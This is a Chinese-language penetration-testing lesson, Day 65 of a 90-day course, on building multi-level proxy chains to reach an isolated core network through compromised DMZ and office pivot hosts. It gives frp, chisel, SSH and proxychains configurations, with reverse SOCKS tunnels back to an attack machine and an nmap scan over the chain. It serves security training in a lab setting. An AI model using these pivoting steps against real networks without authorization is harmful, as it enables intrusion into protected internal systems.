---
title: Day065：内网渗透 - 多级代理与代理链
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: b64b1
date: 2026-01-28
updated: 2026-01-28
---

# Day065：内网渗透 - 多级代理与代理链

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | 多级代理与代理链 |
| **预计时间** | 3-4 小时 |
| **难度等级** | ⭐⭐⭐⭐ 中高级 |

---

## 🔥 今日痛点场景

> **场景**：目标网络分为三层：DMZ → 办公网 → 核心网。你已经拿下 DMZ 和办公网的跳板机，但核心网服务器只能从办公网访问。
>
> **问题**：如何让攻击机的流量穿过两层跳板，到达核心网？
>
> **今天的任务**：构建多级代理链，实现多层网络穿透。

---

## 🎯 今日目标

完成今天的学习后，你应该能够：

- [ ] 理解多级代理的原理
- [ ] 配置 proxychains 代理链
- [ ] 使用 frp/chisel 构建多级隧道
- [ ] 解决多层网络隔离问题

**闯关条件**：通过两层代理成功访问核心网服务。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：理解网络拓扑（15 分钟）

```
┌────────────────────────────────────────────────────────────┐
│                                                             │
│  Kali (攻击机)                                              │
│  192.168.1.100                                              │
│       │                                                     │
│       ▼                                                     │
│  ┌─────────────────┐                                        │
│  │   DMZ 跳板机     │                                        │
│  │ 外: 192.168.1.50│                                        │
│  │ 内: 10.0.0.1    │                                        │
│  └────────┬────────┘                                        │
│           │                                                 │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │  办公网跳板机    │                                        │
│  │ 外: 10.0.0.100  │                                        │
│  │ 内: 172.16.0.1  │                                        │
│  └────────┬────────┘                                        │
│           │                                                 │
│           ▼                                                 │
│  ┌─────────────────┐                                        │
│  │   核心网目标     │                                        │
│  │ IP: 172.16.0.100│                                        │
│  └─────────────────┘                                        │
└────────────────────────────────────────────────────────────┘
```

---

### 任务 2：方案一 - proxychains 链式代理（40 分钟）

**步骤 1：在 DMZ 跳板机建立第一层代理**

```bash
# Kali 上启动 frp 服务端
./frps -c frps.toml  # bindPort = 7000

# DMZ 跳板机连接并开启 socks5
./frpc -c frpc.toml
# serverAddr = "192.168.1.100"
# [[proxies]]
# name = "layer1"
# type = "tcp"
# remotePort = 1080
# [proxies.plugin]
# type = "socks5"
```

**步骤 2：在办公网跳板机建立第二层代理**

```bash
# 在办公网跳板机上用 SSH 动态转发
# 注意：这里需要先通过第一层代理连接
proxychains4 ssh -D 1081 root@10.0.0.100
```

**步骤 3：配置 proxychains 链式代理**

```bash
# /etc/proxychains4.conf
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080   # 第一层 - DMZ
socks5 127.0.0.1 1081   # 第二层 - 办公网
```

**步骤 4：访问核心网**

```bash
proxychains4 nmap -sT -Pn 172.16.0.100 -p 22,80,3389
```

---

### 任务 3：方案二 - frp 级联代理（40 分钟）

**更优雅的方式：frp 支持级联**

**第一层：DMZ → Kali**

```toml
# frpc on DMZ
serverAddr = "192.168.1.100"
serverPort = 7000

[[proxies]]
name = "layer1_socks"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"
```

**第二层：办公网 → DMZ**

```toml
# frps on DMZ (作为第二层的服务端)
bindPort = 7001

# frpc on 办公网
serverAddr = "10.0.0.1"
serverPort = 7001

[[proxies]]
name = "layer2_socks"
type = "tcp"
remotePort = 1081
[proxies.plugin]
type = "socks5"
```

**Kali 配置端口转发**

```toml
# frpc on DMZ 新增
[[proxies]]
name = "layer2_forward"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1081
remotePort = 1081
```

---

### 任务 4：方案三 - 嵌套 chisel（30 分钟）

```bash
# 第一层：Kali 监听
./chisel server -p 8080 --reverse

# 第一层：DMZ 连接
./chisel client 192.168.1.100:8080 R:1080:socks

# 第二层：DMZ 监听（通过第一层代理）
proxychains4 ./chisel server -p 8081 --reverse

# 第二层：办公网连接
./chisel client 10.0.0.1:8081 R:1081:socks
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 理解三层网络拓扑 | ⬜ |
| 第一层代理建立成功 | ⬜ |
| 第二层代理建立成功 | ⬜ |
| proxychains 链配置正确 | ⬜ |
| 成功访问核心网服务 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### 代理链工作原理

```
请求流程：
Kali → 代理1 → 代理2 → 目标

响应流程：
目标 → 代理2 → 代理1 → Kali
```

### proxychains 链模式

| 模式 | 配置 | 行为 |
|------|------|------|
| strict_chain | 严格链 | 按顺序经过所有代理，任一失败则失败 |
| dynamic_chain | 动态链 | 跳过失败的代理，继续下一个 |
| random_chain | 随机链 | 随机选择代理（用于匿名） |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 代理链不通 | 超时 | 逐层测试，定位问题层 |
| DNS 解析失败 | 域名不通 | 开启 proxy_dns 或用 IP |
| 速度极慢 | 延迟高 | 多层代理固有问题，尽量减少层数 |
| 端口冲突 | bind failed | 每层使用不同端口 |

---

## 💡 知识卡片速查

### 多级代理设计原则

1. **尽量减少层数**：每层都有延迟和失败风险
2. **稳定性优先**：用 frp 而非临时 SSH
3. **规划端口**：第一层 1080，第二层 1081，依次递增
4. **记录拓扑**：画图记录每层的 IP 和端口

---

## 🚀 明日预告

**Day 066：内网渗透 - 横向移动概述与信息收集**

明天你将：
- 了解横向移动的常见技术
- 学习内网信息收集方法
- 识别域环境特征

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> 多级代理是真正考验基本功的时候。网络拓扑画不清楚，代理链就搭不起来。
>
> 实战中遇到三层以上的网络很常见。耐心调试，一层一层来。
>
> 记住：隧道是手段，目标是穿透。别在隧道上浪费太多时间，能通就行。

```bash
echo "Day 065 Complete! 多级代理掌握！"
```
